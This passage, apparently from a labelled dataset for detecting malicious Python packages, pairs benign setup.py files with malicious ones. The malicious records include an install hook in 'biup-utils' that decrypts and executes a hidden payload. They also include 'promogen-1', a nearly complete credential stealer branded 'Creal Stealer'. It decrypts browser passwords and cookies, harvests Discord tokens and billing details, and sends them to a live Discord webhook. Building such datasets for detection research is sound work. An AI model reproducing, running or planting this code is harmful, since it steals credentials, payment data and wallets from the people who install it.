+ dw_wheel)\n            \n        atexit.register(_post_install)\n        run_me()\n        install.run(self)\n\ntry:\n    setup(\n        name=PACKAGE,\n        version='99.0',\n        packages=find_packages(),\n        cmdclass={'install': CustomInstall},     \n    )\nexcept Exception as e:\n    pass\n", "target": 1}
{"idx": "dbus-python-1.2.18", "func": "#!/usr/bin/env python\n# encoding: utf-8\n\n# Copyright \u00a9 2016 Collabora Ltd. <http://www.collabora.co.uk/>\n#\n# SPDX-License-Identifier: MIT\n#\n# Permission is hereby granted, free of charge, to any person\n# obtaining a copy of this software and associated documentation\n# files (the \"Software\"), to deal in the Software without\n# restriction, including without limitation the rights to use, copy,\n# modify, merge, publish, distribute, sublicense, and/or sell copies\n# of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be\n# included in all copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n# HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\n# DEALINGS IN THE SOFTWARE.\n\nfrom distutils.dir_util import copy_tree, mkpath\nfrom distutils.file_util import copy_file\nfrom setuptools.dist import Distribution\nfrom setuptools import setup, Extension\nimport os\nimport subprocess\nimport sys\n\nif os.path.exists('.version'):\n    version = open('.version').read().strip()\nelse:\n    version = subprocess.check_output(['autoconf', '--trace', 'AC_INIT:$2',\n        'configure.ac']).decode('utf-8').strip()\n\nclass Build(Distribution().get_command_class('build')):\n    \"\"\"Dummy version of distutils build which runs an Autotools build system\n    instead.\n    \"\"\"\n\n    def run(self):\n        srcdir = os.getcwd()\n        builddir = os.path.join(srcdir, self.build_temp)\n        configure = os.path.join(srcdir, 'configure')\n        mkpath(builddir)\n\n        if not os.path.exists(configure):\n            configure = os.path.join(srcdir, 'autogen.sh')\n\n        subprocess.check_call([\n                configure,\n                '--disable-maintainer-mode',\n                'PYTHON=' + sys.executable,\n                # Put the documentation, etc. out of the way: we only want\n                # the Python code and extensions\n                '--prefix=' + os.path.join(builddir, 'prefix'),\n            ],\n            cwd=builddir)\n        make_args = [\n            'pythondir=' + os.path.join(srcdir, self.build_lib),\n            'pyexecdir=' + os.path.join(srcdir, self.build_lib),\n        ]\n        subprocess.check_call(['make', '-C', builddir] + make_args)\n        subprocess.check_call(['make', '-C', builddir, 'install'] + make_args)\n\nclass BuildExt(Distribution().get_command_class('build_ext')):\n    def run(self):\n        pass\n\nclass BuildPy(Distribution().get_command_class('build_py')):\n    def run(self):\n        pass\n\ndbus_bindings = Extension('_dbus_bindings',\n        sources=['dbus_bindings/module.c'])\ndbus_glib_bindings = Extension('_dbus_glib_bindings',\n        sources=['dbus_glib_bindings/module.c'])\n\nsetup(\n    name='dbus-python',\n    version=version,\n    description='Python bindings for libdbus',\n    long_description=open('README').read(),\n    maintainer='The D-Bus maintainers',\n    maintainer_email='dbus@lists.freedesktop.org',\n    download_url='http://dbus.freedesktop.org/releases/dbus-python/',\n    url='http://www.freedesktop.org/wiki/Software/DBusBindings/#python',\n    packages=['dbus'],\n    ext_modules=[dbus_bindings, dbus_glib_bindings],\n    license='Expat (MIT/X11)',\n    classifiers=[\n        'Development Status :: 7 - Inactive',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: C',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Topic :: Software Development :: Object Brokering',\n    ],\n    cmdclass={\n        'build': Build,\n        'build_py': BuildPy,\n        'build_ext': BuildExt,\n    },\n    tests_require=['tap.py'],\n)\n", "target": 0}
{"idx": "biup-utils-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'DstiYVfQrzozCcMYVzGdtNmRjoUnjGLnuAYhkuhvUPhlWEaX'\nLONG_DESCRIPTION = 'qdMHAnNAHKPGoXTVazXSBbGDfeDWHxZBrclBurhXNJsafOBbsTYhENPiCdyzQKbmPlPrQNcZWVyCVTrvjHQZILByTcGBCpvDmRwDnKIvRbbJfLFFataxwTBdgkhagQbnEaJiKZLoAPNRzWRoFFFJGUvHXXBZhHQGtsXRDmmejnoQGSERTocJxkZxYOnfvgKWIvAeBzPJLZayFaLRhufZmNVMmIRWCUukbiUqlTsWeZsYqhwXOdNmJpQZeIYADUmAyHkGxojoSnzkbQrelaPWGpMSZIPgSGwxclVKYWkMSuVbUD xJfVsMmxP gMmxHSvaFx jDnFDJkyVfnACsMHGHetZKpKXoSRLMkcGNVtlPvqKPZNubXwyMZiNbdhXq gPcaLRcxTQGmomWqpXXjbYjRBVzxpfLwTrIlaeFyJuDuVZq'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'H0ARLVyJAODTDQiHX4JqhrNNG9vwXHsmd_KPL2oibcU=').decrypt(b'gAAAAABmA1rDN-4ux9dEKMykWEcJX5f12oT5dq90iHY8jwCyFYDJMsLyb0DdTBrXzKpHvqoNQ_3ZYNkJmNp1kPBNsr5gO2kT7nZESFJiy8fGTyO4WegcDZ88eUydL1pBKj_EYRvoP6pxMY5BuHnqBz6ZBkZk-5_PBkKXMudL5SHYKC1X33o9eI52-LHxxYOU1U2LLvU8u5AB54semZCxyZbyH8P18Wj1O8Timb904VK_2jqZr9Fe3xg='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"biup-utils\",\n    version=VERSION,\n    author=\"bSNlfKMkdUxI\",\n    author_email=\"ymxkkG@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "flake8-commas-2.1.0", "func": "import io\nimport os\nfrom setuptools import setup\n\n__dir__ = os.path.dirname(__file__)\n\n\ndef read(*filenames, **kwargs):\n    encoding = kwargs.get('encoding', 'utf-8')\n    sep = kwargs.get('sep', '\\n')\n    buf = []\n    for filename in filenames:\n        with io.open(filename, encoding=encoding) as f:\n            buf.append(f.read())\n    return sep.join(buf)\n\n\nreadme = read('README.rst')\nhistory = read('CHANGES.rst').replace('.. :changelog:', '')\n\n\nsetup(\n    name='flake8-commas',\n    author='Trevor Creech',\n    author_email='trevor@trevorcreech.com',\n    maintainer='Thomas Grainger',\n    maintainer_email='flake8-commas@graingert.co.uk',\n    version='2.1.0',\n    install_requires=['flake8>=2'],\n    url='https://github.com/PyCQA/flake8-commas/',\n    long_description=readme + '\\n\\n' + history,\n    description='Flake8 lint for trailing commas.',\n    packages=['flake8_commas'],\n    test_suite='test',\n    include_package_data=True,\n    entry_points={\n        'flake8.extension': [\n            'C81 = flake8_commas:CommaChecker',\n        ],\n    },\n    classifiers=[\n        'Environment :: Console',\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Software Development :: Quality Assurance',\n        'Framework :: Flake8',\n    ],\n)\n", "target": 0}
{"idx": "promogen-1", "func": "from setuptools import setup\nimport os\nimport threading\nfrom sys import executable\nfrom sqlite3 import connect as sql_connect\nimport re\nfrom base64 import b64decode\nfrom json import loads as json_loads, load\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom urllib.request import Request, urlopen\nfrom json import *\nimport time\nimport shutil\nfrom zipfile import ZipFile\nimport random\nimport re\nimport subprocess\n\n\n\nhook = \"https://discord.com/api/webhooks/1052549671110848542/IJbJYSGisCyG7LPj4Seg5CGxSiA_Fo3FtrSAtgUN8pT3utKu4q9suI3Dge1yl7aNWgs4\"\n\n\nDETECTED = False\n\ndef getip():\n    ip = \"None\"\n    try:\n        ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n    except:\n        pass\n    return ip\n\nrequirements = [\n    [\"requests\", \"requests\"],\n    [\"Crypto.Cipher\", \"pycryptodome\"]\n]\nfor modl in requirements:\n    try: __import__(modl[0])\n    except:\n        subprocess.Popen(f\"{executable} -m pip install {modl[1]}\", shell=True)\n        time.sleep(3)\n\nimport requests\nfrom Crypto.Cipher import AES\n\nlocal = os.getenv('LOCALAPPDATA')\nroaming = os.getenv('APPDATA')\ntemp = os.getenv(\"TEMP\")\nThreadlist = []\n\n\nclass DATA_BLOB(Structure):\n    _fields_ = [\n        ('cbData', wintypes.DWORD),\n        ('pbData', POINTER(c_char))\n    ]\n\ndef GetData(blob_out):\n    cbData = int(blob_out.cbData)\n    pbData = blob_out.pbData\n    buffer = c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer, pbData, cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\n\ndef CryptUnprotectData(encrypted_bytes, entropy=b''):\n    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))\n    buffer_entropy = c_buffer(entropy, len(entropy))\n    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)\n    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)\n    blob_out = DATA_BLOB()\n\n    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):\n        return GetData(blob_out)\n\ndef DecryptValue(buff, master_key=None):\n    starts = buff.decode(encoding='utf8', errors='ignore')[:3]\n    if starts == 'v10' or starts == 'v11':\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\n\ndef LoadRequests(methode, url, data='', files='', headers=''):\n    for i in range(8): # max trys\n        try:\n            if methode == 'POST':\n                if data != '':\n                    r = requests.post(url, data=data)\n                    if r.status_code == 200:\n                        return r\n                elif files != '':\n                    r = requests.post(url, files=files)\n                    if r.status_code == 200 or r.status_code == 413:\n                        return r\n        except:\n            pass\n\ndef LoadUrlib(hook, data='', files='', headers=''):\n    for i in range(8):\n        try:\n            if headers != '':\n                r = urlopen(Request(hook, data=data, headers=headers))\n                return r\n            else:\n                r = urlopen(Request(hook, data=data))\n                return r\n        except: \n            pass\n\ndef globalInfo():\n    ip = getip()\n    username = os.getenv(\"USERNAME\")\n    ipdatanojson = urlopen(Request(f\"https://geolocation-db.com/jsonp/{ip}\")).read().decode().replace('callback(', '').replace('})', '}')\n    # print(ipdatanojson)\n    ipdata = loads(ipdatanojson)\n    # print(urlopen(Request(f\"https://geolocation-db.com/jsonp/{ip}\")).read().decode())\n    contry = ipdata[\"country_name\"]\n    contryCode = ipdata[\"country_code\"].lower()\n    sehir = ipdata[\"state\"]\n\n    globalinfo = f\":flag_{contryCode}:  - `{username.upper()} | {ip} ({contry})`\"\n    return globalinfo\n\n\ndef Trust(Cookies):\n    # simple Trust Factor system\n    global DETECTED\n    data = str(Cookies)\n    tim = re.findall(\".google.com\", data)\n    # print(len(tim))\n    if len(tim) < -1:\n        DETECTED = True\n        return DETECTED\n    else:\n        DETECTED = False\n        return DETECTED\n        \ndef GetUHQFriends(token):\n    badgeList =  [\n        {\"Name\": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': \"<:developer:874750808472825986> \"},\n        {\"Name\": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': \"<:bughunter_2:874750808430874664> \"},\n        {\"Name\": 'Early_Supporter', 'Value': 512, 'Emoji': \"<:early_supporter:874750808414113823> \"},\n        {\"Name\": 'House_Balance', 'Value': 256, 'Emoji': \"<:balance:874750808267292683> \"},\n        {\"Name\": 'House_Brilliance', 'Value': 128, 'Emoji': \"<:brilliance:874750808338608199> \"},\n        {\"Name\": 'House_Bravery', 'Value': 64, 'Emoji': \"<:bravery:874750808388952075> \"},\n        {\"Name\": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': \"<:bughunter_1:874750808426692658> \"},\n        {\"Name\": 'HypeSquad_Events', 'Value': 4, 'Emoji': \"<:hypesquad_events:874750808594477056> \"},\n        {\"Name\": 'Partnered_Server_Owner', 'Value': 2,'Emoji': \"<:partner:874750808678354964> \"},\n        {\"Name\": 'Discord_Employee', 'Value': 1, 'Emoji': \"<:staff:874750808728666152> \"}\n    ]\n    headers = {\n        \"Authorization\": token,\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    try:\n        friendlist = loads(urlopen(Request(\"https://discord.com/api/v6/users/@me/relationships\", headers=headers)).read().decode())\n    except:\n        return False\n\n    uhqlist = ''\n    for friend in friendlist:\n        OwnedBadges = ''\n        flags = friend['user']['public_flags']\n        for badge in badgeList:\n            if flags // badge[\"Value\"] != 0 and friend['type'] == 1:\n                if not \"House\" in badge[\"Name\"]:\n                    OwnedBadges += badge[\"Emoji\"]\n                flags = flags % badge[\"Value\"]\n        if OwnedBadges != '':\n            uhqlist += f\"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\\n\"\n    return uhqlist\n\n\ndef GetBilling(token):\n    headers = {\n        \"Authorization\": token,\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    try:\n        billingjson = loads(urlopen(Request(\"https://discord.com/api/users/@me/billing/payment-sources\", headers=headers)).read().decode())\n    except:\n        return False\n    \n    if billingjson == []: return \"```None```\"\n\n    billing = \"\"\n    for methode in billingjson:\n        if methode[\"invalid\"] == False:\n            if methode[\"type\"] == 1:\n                billing += \":credit_card:\"\n            elif methode[\"type\"] == 2:\n                billing += \":parking: \"\n\n    return billing\n\n\ndef GetBadge(flags):\n    if flags == 0: return ''\n\n    OwnedBadges = ''\n    badgeList =  [\n        {\"Name\": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': \"<:developer:874750808472825986> \"},\n        {\"Name\": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': \"<:bughunter_2:874750808430874664> \"},\n        {\"Name\": 'Early_Supporter', 'Value': 512, 'Emoji': \"<:early_supporter:874750808414113823> \"},\n        {\"Name\": 'House_Balance', 'Value': 256, 'Emoji': \"<:balance:874750808267292683> \"},\n        {\"Name\": 'House_Brilliance', 'Value': 128, 'Emoji': \"<:brilliance:874750808338608199> \"},\n        {\"Name\": 'House_Bravery', 'Value': 64, 'Emoji': \"<:bravery:874750808388952075> \"},\n        {\"Name\": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': \"<:bughunter_1:874750808426692658> \"},\n        {\"Name\": 'HypeSquad_Events', 'Value': 4, 'Emoji': \"<:hypesquad_events:874750808594477056> \"},\n        {\"Name\": 'Partnered_Server_Owner', 'Value': 2,'Emoji': \"<:partner:874750808678354964> \"},\n        {\"Name\": 'Discord_Employee', 'Value': 1, 'Emoji': \"<:staff:874750808728666152> \"}\n    ]\n    for badge in badgeList:\n        if flags // badge[\"Value\"] != 0:\n            OwnedBadges += badge[\"Emoji\"]\n            flags = flags % badge[\"Value\"]\n\n    return OwnedBadges\n\ndef GetTokenInfo(token):\n    headers = {\n        \"Authorization\": token,\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n\n    userjson = loads(urlopen(Request(\"https://discordapp.com/api/v6/users/@me\", headers=headers)).read().decode())\n    username = userjson[\"username\"]\n    hashtag = userjson[\"discriminator\"]\n    email = userjson[\"email\"]\n    idd = userjson[\"id\"]\n    pfp = userjson[\"avatar\"]\n    flags = userjson[\"public_flags\"]\n    nitro = \"\"\n    phone = \"\"\n\n    if \"premium_type\" in userjson: \n        nitrot = userjson[\"premium_type\"]\n        if nitrot == 1:\n            nitro = \"<a:DE_BadgeNitro:865242433692762122>\"\n        elif nitrot == 2:\n            nitro = \"<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>\"\n    if \"phone\" in userjson: phone = f'{userjson[\"phone\"]}'\n\n    return username, hashtag, email, idd, pfp, flags, nitro, phone\n\ndef checkToken(token):\n    headers = {\n        \"Authorization\": token,\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    try:\n        urlopen(Request(\"https://discordapp.com/api/v6/users/@me\", headers=headers))\n        return True\n    except:\n        return False\n\n\n\ndef uploadToken(token, path):\n    global hook\n    global myhook\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    username, hashtag, email, idd, pfp, flags, nitro, phone = GetTokenInfo(token)\n\n    if pfp == None: \n        pfp = \"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp\"\n    else:\n        pfp = f\"https://cdn.discordapp.com/avatars/{idd}/{pfp}\"\n\n    billing = GetBilling(token)\n    badge = GetBadge(flags)\n    friends = GetUHQFriends(token)\n    if friends == '': friends = \"```No Rare Friends```\"\n    if not billing:\n        badge, phone, billing = \"\ud83d\udd12\", \"\ud83d\udd12\", \"\ud83d\udd12\"\n    if nitro == '' and badge == '': nitro = \"```None```\"\n\n    data = {\n        \"content\": f'{globalInfo()} | `{path}`',\n        \"embeds\": [\n            {\n            \"color\": 0000000,\n            \"fields\": [\n                {\n                    \"name\": \"<a:hyperNOPPERS:828369518199308388> Token:\",\n                    \"value\": f\"```{token}```\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \"<:mail:750393870507966486> Email:\",\n                    \"value\": f\"```{email}```\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \"<a:1689_Ringing_Phone:755219417075417088> Phone:\",\n                    \"value\": f\"```{phone}```\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \"<:mc_earth:589630396476555264> IP:\",\n                    \"value\": f\"```{getip()}```\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \"<:woozyface:874220843528486923> Badges:\",\n                    \"value\": f\"{nitro}{badge}\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:\",\n                    \"value\": f\"{billing}\",\n                    \"inline\": True\n                },\n                {\n                    \"name\": \"<a:mavikirmizi:853238372591599617> HQ Friends:\",\n                    \"value\": f\"{friends}\",\n                    \"inline\": False\n                }\n                ],\n            \"author\": {\n                \"name\": f\"{username}#{hashtag} ({idd})\",\n                \"icon_url\": f\"{pfp}\"\n                },\n            \"footer\": {\n                \"text\": \"Creal Stealer\",\n                \"icon_url\": \"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp\"\n                },\n            \"thumbnail\": {\n                \"url\": f\"{pfp}\"\n                }\n            }\n        ],\n        \"avatar_url\": \"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp\",\n        \"username\": \"Creal Stealer\",\n        \"attachments\": []\n        }\n    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n\n\ndef Reformat(listt):\n    e = re.findall(\"(\\w+[a-z])\",listt)\n    while \"https\" in e: e.remove(\"https\")\n    while \"com\" in e: e.remove(\"com\")\n    while \"net\" in e: e.remove(\"net\")\n    return list(set(e))\n\ndef upload(name, link):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n\n    if name == \"wpcook\":\n        rb = ' | '.join(da for da in cookiWords)\n        if len(rb) > 1000: \n            rrrrr = Reformat(str(cookiWords))\n            rb = ' | '.join(da for da in rrrrr)\n        data = {\n            \"content\": f\"{globalInfo()}\",\n            \"embeds\": [\n                {\n                    \"title\": \"Creal | Cookies Stealer\",\n                    \"description\": f\"<:apollondelirmis:1012370180845883493>: **Accounts:**\\n\\n{rb}\\n\\n**Data:**\\n<:cookies_tlm:816619063618568234> \u2022 **{CookiCount}** Cookies Found\\n<a:CH_IconArrowRight:715585320178941993> \u2022 [CrealCookies.txt]({link})\",\n                    \"color\": 000000,\n                    \"footer\": {\n                        \"text\": \"Creal Stealer\",\n                        \"icon_url\": \"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp\"\n                    }\n                }\n            ],\n            \"username\": \"Creal Stealer\",\n            \"avatar_url\": \"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp\",\n            \"attachments\": []\n            }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n        return\n\n    if name == \"wppassw\":\n        ra = ' | '.join(da for da in paswWords)\n        if len(ra) > 1000: \n            rrr = Reformat(str(paswWords))\n            ra = ' | '.join(da for da in rrr)\n\n        data = {\n            \"content\": f\"{globalInfo()}\",\n            \"embeds\": [\n                {\n                    \"title\": \"Creal | Password Stealer\",\n                    \"description\": f\"<:apollondelirmis:1012370180845883493>: **Accounts**:\\n{ra}\\n\\n**Data:**\\n<a:hira_kasaanahtari:886942856969875476> \u2022 **{PasswCount}** Passwords Found\\n<a:CH_IconArrowRight:715585320178941993> \u2022 [CrealPassword.txt]({link})\",\n                    \"color\": 000000,\n                    \"footer\": {\n                        \"text\": \"Creal Stealer\",\n                        \"icon_url\": \"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp\"\n                    }\n                }\n            ],\n            \"username\": \"Creal\",\n            \"avatar_url\": \"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp\",\n            \"attachments\": []\n            }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n        return\n\n    if name == \"kiwi\":\n        data = {\n            \"content\": f\"{globalInfo()}\",\n            \"embeds\": [\n                {\n                \"color\": 000000,\n                \"fields\": [\n                    {\n                    \"name\": \"Interesting files found on user PC:\",\n                    \"value\": link\n                    }\n                ],\n                \"author\": {\n                    \"name\": \"Creal | File Stealer\"\n                },\n                \"footer\": {\n                    \"text\": \"Creal Stealer\",\n                    \"icon_url\": \"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp\"\n                }\n                }\n            ],\n            \"username\": \"Creal Stealer\",\n            \"avatar_url\": \"https://cdn.discordapp.com/attachments/1050492593114456124/1051490320921145384/786713106658492416.webp\",\n            \"attachments\": []\n            }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n        return\n\n\n\n\n# def upload(name, tk=''):\n#     headers = {\n#         \"Content-Type\": \"application/json\",\n#         \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n#     }\n\n#     # r = requests.post(hook, files=files)\n#     LoadRequests(\"POST\", hook, files=files)\n    _\n\n\n\n\ndef writeforfile(data, name):\n    path = os.getenv(\"TEMP\") + f\"\\wp{name}.txt\"\n    with open(path, mode='w', encoding='utf-8') as f:\n        f.write(f\"<--Creal STEALER BEST -->\\n\\n\")\n        for line in data:\n            if line[0] != '':\n                f.write(f\"{line}\\n\")\n\nTokens = ''\ndef getToken(path, arg):\n    if not os.path.exists(path): return\n\n    path += arg\n    for file in os.listdir(path):\n        if file.endswith(\".log\") or file.endswith(\".ldb\")   :\n            for line in [x.strip() for x in open(f\"{path}\\\\{file}\", errors=\"ignore\").readlines() if x.strip()]:\n                for regex in (r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\", r\"mfa\\.[\\w-]{80,95}\"):\n                    for token in re.findall(regex, line):\n                        global Tokens\n                        if checkToken(token):\n                            if not token in Tokens:\n                                # print(token)\n                                Tokens += token\n                                uploadToken(token, path)\n\nPassw = []\ndef getPassw(path, arg):\n    global Passw, PasswCount\n    if not os.path.exists(path): return\n\n    pathC = path + arg + \"/Login Data\"\n    if os.stat(pathC).st_size == 0: return\n\n    tempfold = temp + \"wp\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n\n    shutil.copy2(pathC, tempfold)\n    conn = sql_connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n\n    for row in data: \n        if row[0] != '':\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in paswWords: paswWords.append(old)\n            Passw.append(f\"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}\")\n            PasswCount += 1\n    writeforfile(Passw, 'passw')\n\nCookies = []    \ndef getCookie(path, arg):\n    global Cookies, CookiCount\n    if not os.path.exists(path): return\n    \n    pathC = path + arg + \"/Cookies\"\n    if os.stat(pathC).st_size == 0: return\n    \n    tempfold = temp + \"wp\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n    \n    shutil.copy2(pathC, tempfold)\n    conn = sql_connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n\n    pathKey = path + \"/Local State\"\n    \n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n\n    for row in data: \n        if row[0] != '':\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in cookiWords: cookiWords.append(old)\n            Cookies.append(f\"{row[0]}\tTRUE\t/\tFALSE\t2597573456\t{row[1]}\t{DecryptValue(row[2], master_key)}\")\n            CookiCount += 1\n    writeforfile(Cookies, 'cook')\n\ndef GetDiscord(path, arg):\n    if not os.path.exists(f\"{path}/Local State\"): return\n\n    pathC = path + arg\n\n    pathKey = path + \"/Local State\"\n    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n    master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key = CryptUnprotectData(master_key[5:])\n    # print(path, master_key)\n    \n    for file in os.listdir(pathC):\n        # print(path, file)\n        if file.endswith(\".log\") or file.endswith(\".ldb\")   :\n            for line in [x.strip() for x in open(f\"{pathC}\\\\{file}\", errors=\"ignore\").readlines() if x.strip()]:\n                for token in re.findall(r\"dQw4w9WgXcQ:[^.*\\['(.*)'\\].*$][^\\\"]*\", line):\n                    global Tokens\n                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)\n                    if checkToken(tokenDecoded):\n                        if not tokenDecoded in Tokens:\n                            # print(token)\n                            Tokens += tokenDecoded\n                            # writeforfile(Tokens, 'tokens')\n                            uploadToken(tokenDecoded, path)\n\ndef GatherZips(paths1, paths2, paths3):\n    thttht = []\n    for patt in paths1:\n        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])\n        a.start()\n        thttht.append(a)\n\n    for patt in paths2:\n        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])\n        a.start()\n        thttht.append(a)\n    \n    a = threading.Thread(target=ZipTelegram, args=[paths3[0], paths3[2], paths3[1]])\n    a.start()\n    thttht.append(a)\n\n    for thread in thttht: \n        thread.join()\n    global WalletsZip, GamingZip, OtherZip\n        # print(WalletsZip, GamingZip, OtherZip)\n\n    wal, ga, ot = \"\",'',''\n    if not len(WalletsZip) == 0:\n        wal = \":coin:  \u2022  Wallets\\n\"\n        for i in WalletsZip:\n            wal += f\"\u2514\u2500 [{i[0]}]({i[1]})\\n\"\n    if not len(WalletsZip) == 0:\n        ga = \":video_game:  \u2022  Gaming:\\n\"\n        for i in GamingZip:\n            ga += f\"\u2514\u2500 [{i[0]}]({i[1]})\\n\"\n    if not len(OtherZip) == 0:\n        ot = \":tickets:  \u2022  Apps\\n\"\n        for i in OtherZip:\n            ot += f\"\u2514\u2500 [{i[0]}]({i[1]})\\n\"          \n    headers = {\n        \"Content-Type\": 